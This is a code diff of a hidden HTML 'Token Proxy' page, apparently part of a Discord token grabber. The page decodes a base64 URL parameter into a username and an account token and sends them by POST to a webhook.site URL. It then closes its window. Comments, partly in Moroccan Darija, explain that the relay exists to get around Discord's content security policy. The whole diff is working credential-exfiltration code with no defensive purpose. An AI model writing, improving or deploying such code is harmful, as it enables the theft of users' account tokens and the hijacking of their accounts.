@@ -4,35 +4,63 @@
     <title>Token Proxy</title>
     <!-- Had l'page ghadi tkon makhfiya, ma kayban fiha walou -->
     <script>
+        // ⚠️ IMPORTANT: BDDEL HAD L'URL B'L'URL DIAL WEBHOOK.SITE DIALEK L'ORIGINAL
         const WEBHOOK_SITE_URL = "https://webhook.site/discordquest"; 
 
         const params = new URLSearchParams(window.location.search);
-        let dataToSend;
+        let payloadToWebhook = {}; // Had l'objet howa li ghadi nsiftoh l'webhook.site
 
+        // If the 'd' parameter (data) is present
         if (params.has('d')) {
-            const secretData = params.get('d');
-            dataToSend = { d: secretData }; // Data with tag and token
-        } else if (params.has('err')) {
-            const errorToken = params.get('err');
-            dataToSend = { err: errorToken }; // Fallback with raw token
+            try {
+                const secretData = params.get('d');
+                // Decode Base64 then decode URI component
+                const decodedString = decodeURIComponent(atob(secretData));
+                
+                // Split the string into username and token (kanet `${tag}|${token}`)
+                const [username, token] = decodedString.split('|');
+
+                // Prepare the payload in the desired format
+                payloadToWebhook = {
+                    "Username": username,
+                    "Token": token
+                };
+            } catch (e) {
+                console.error("Error decoding 'd' parameter:", e);
+                // Fallback in case of decoding error
+                payloadToWebhook = { "Error during decoding 'd'": params.get('d') };
+            }
+        } 
+        // If the 'err' parameter (error token) is present
+        else if (params.has('err')) {
+            try {
+                const errorToken = params.get('err');
+                const decodedErrorToken = atob(errorToken); // Decode Base64
+                
+                payloadToWebhook = {
+                    "Error Token": decodedErrorToken // Label for raw token on error
+                };
+            } catch (e) {
+                console.error("Error decoding 'err' parameter:", e);
+                // Fallback in case of decoding error
+                payloadToWebhook = { "Error during decoding 'err'": params.get('err') };
+            }
         }
 
-        if (dataToSend) {
-            // Ghadi ndirou l'POST request l'webhook.site men had l'page dial GitHub Pages
-            // Had l'connection ma ghat'violīch l'CSP dial Discord hit Discord ghir 7el pop-up l'github.io
-            // W l'origine dial had l'fetch request huwa github.io, li webhook.site kayqbel bih
+        // Only send the fetch request if there's data to send
+        if (Object.keys(payloadToWebhook).length > 0) {
             fetch(WEBHOOK_SITE_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(dataToSend)
+                body: JSON.stringify(payloadToWebhook) // Kanseftou l'objet m'structured
             })
             .then(response => {
                 if (!response.ok) {
                     console.error('Webhook.site proxy error, status:', response.status);
                 }
-                return response.text(); // Nqraw l'response gha bach nlogiw
+                return response.text(); 
             })
             .then(text => {
                 console.log('Token data forwarded to webhook.site successfully from proxy. Response:', text);
@@ -41,11 +69,10 @@
                 console.error('Error forwarding token data to webhook.site from proxy:', error);
             })
             .finally(() => {
-                // Nseddou l'fenêtre dial proxy f'l'aḥir
                 window.close();
             });
         } else {
-             // Close if no data to send (e.g., direct access to proxy.html)
+             // Close if no valid data or error parameter found
             window.close();
         }
     </script>
